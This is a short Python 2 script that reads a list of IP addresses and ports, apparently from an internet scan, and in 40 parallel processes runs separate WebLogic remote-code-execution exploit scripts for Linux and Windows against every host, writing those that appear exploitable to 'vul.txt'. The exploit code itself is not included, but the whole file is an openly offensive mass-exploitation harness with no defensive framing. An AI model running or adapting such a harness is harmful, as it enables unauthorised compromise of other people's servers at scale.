#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
from multiprocessing import Pool
import sys

def check(ip_port):
    ip = ip_port[0]
    port = ip_port[1]
    commands = [
        'python linux_weblogic_rce_exp.py -target @IP -port @PORT -cmd init',
        'python windows_weblogic_rce_exp.py -target @IP -port @PORT -cmd init',
    ]
    for command in commands:
        cmd = command.replace('@IP', ip).replace('@PORT', port)
        print cmd
        # os.system(cmd)
        output = os.popen(cmd).readlines()
        print output
        if output[-1].find('not') == -1:
            result = open('vul.txt', 'a')
            result.write(ip + ':' + port + '\n')
            result.close()
            print ip + port + 'is vul!',
            break
    print ''

if __name__=='__main__':
    urls = []
    for line in open(sys.argv[1]):
        line = line.strip()
        if not line.split(',')[0] == "saddr":
            urls.append(line.split(','))
    pool = Pool(40)
    pool.map(check, urls)
    pool.close()
    pool.join()


